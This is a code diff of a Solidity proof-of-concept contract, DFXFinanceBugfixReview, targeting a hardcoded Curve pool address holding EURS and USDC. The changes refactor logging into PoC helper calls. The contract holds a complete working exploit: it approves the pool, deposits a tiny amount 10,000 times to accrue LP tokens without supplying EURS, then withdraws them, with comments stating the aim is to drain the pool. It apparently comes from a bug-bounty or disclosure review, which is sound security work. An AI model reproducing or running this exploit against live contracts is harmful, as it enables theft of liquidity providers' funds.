@@ -2,37 +2,28 @@
 pragma solidity ^0.8.0;
 
 import "../src/tokens/Tokens.sol";
+import "../src/PoC.sol";
 
-contract DFXFinanceBugfixReview is Tokens {
+contract DFXFinanceBugfixReview is PoC {
     ICurve constant curve_pool = ICurve(0x2385D7aB31F5a470B1723675846cb074988531da);
     IERC20 constant EURS = IERC20(0xE111178A87A3BFf0c8d18DECBa5798827539Ae99);
 
+    IERC20[] tokens;
+
     function initiateAttack() external {
-        console.log("\n>>> Initiate attack\n");
+        tokens.push(PolygonTokens.USDC);
+        tokens.push(EURS);
 
-        // Deal tokens to attacker
-        console.log("> Deal 100 EURS and 100 USDC to attacker");
-        deal(PolygonTokens.USDC, address(this), 100 * 1e6);
-        deal(EURS, address(this), 100 * 1e2);
-
-        uint256 attacker_euro_balance = EURS.balanceOf(address(this));
-        uint256 attacker_usdc_balance = PolygonTokens.USDC.balanceOf(address(this));
-
-        console.log("EURO balance of attacker:", attacker_euro_balance);
-        console.log("USDC balance of attacker:", attacker_usdc_balance);
-
-        uint256 curve_euro_balance = EURS.balanceOf(address(curve_pool));
-        uint256 curve_usdc_balance = PolygonTokens.USDC.balanceOf(address(curve_pool));
-
-        console.log("EURO balance of Curve pool:", curve_euro_balance);
-        console.log("USDC balance of Curve pool:", curve_usdc_balance);
+        // snapshotAndPrint(address(curve_pool), tokens);
+        setAlias(address(curve_pool), "curve_pool");
+        setAlias(address(this), "Attacker");
 
         // Execute attack multiple times to drain pool
         _executeAttack();
     }
 
     function _executeAttack() internal {
-        console.log("\n>>> Execute attack\n");
+        console.log("\n>>> Execute attack");
 
         // Approve curve pool to use funds
         PolygonTokens.USDC.approve(address(curve_pool), PolygonTokens.USDC.balanceOf(address(this)));
@@ -48,40 +39,28 @@ contract DFXFinanceBugfixReview is Tokens {
 
         // Deposit small amount in a loop 10,000 times to gain curve LP tokens without depositing EURS
         // If gas price is 231 wei = 0.000000231651787155 => Gas = 161 matic
-        console.log("> Deposit small amount to curve pool 10,000 times");
+        console.log("Deposit small amount to curve pool 10,000 times");
         for (uint256 i = 0; i < 10000; i++) {
             curve_pool.deposit(deposit, minQuoteAmount, minBaseAmount, maxQuoteAmount, maxBaseAmount, deadline);
         }
 
-        uint256 attacker_euro_balance = EURS.balanceOf(address(this));
-        uint256 attacker_usdc_balance = PolygonTokens.USDC.balanceOf(address(this));
+        snapshotAndPrint(address(this), tokens);
 
-        console.log("EURO balance of attacker:", attacker_euro_balance);
-        console.log("USDC balance of attacker:", attacker_usdc_balance);
+        console.log("Withdraw curve pool LP tokens");
 
-        console.log("> Withdraw curve pool LP tokens");
-        uint256 curvesToBurn = curve_pool.balanceOf(address(this));
-        console.log("CURVE balance of attacker:", curvesToBurn);
+        IERC20[] memory curve_token = new IERC20[](1);
+        curve_token[0] = IERC20(address(curve_pool));
+        snapshotAndPrint(address(this), curve_token);
+
         // Withdraw curve LP tokens to receive proportion of liquidity in pool of EURS and USDC
+        uint256 curvesToBurn = curve_pool.balanceOf(address(this));
         curve_pool.withdraw(curvesToBurn, deadline);
 
         _completeAttack();
     }
 
     function _completeAttack() internal {
-        console.log("\n>>> Attack complete\n");
-
-        uint256 attacker_euro_balance = EURS.balanceOf(address(this));
-        uint256 attacker_usdc_balance = PolygonTokens.USDC.balanceOf(address(this));
-
-        console.log("EURO balance of attacker:", attacker_euro_balance);
-        console.log("USDC balance of attacker:", attacker_usdc_balance);
-
-        uint256 curve_euro_balance = EURS.balanceOf(address(curve_pool));
-        uint256 curve_usdc_balance = PolygonTokens.USDC.balanceOf(address(curve_pool));
-
-        console.log("EURO balance of Curve pool:", curve_euro_balance);
-        console.log("USDC balance of Curve pool:", curve_usdc_balance);
+        console.log("\n>>> Complete attack");
     }
 }
 
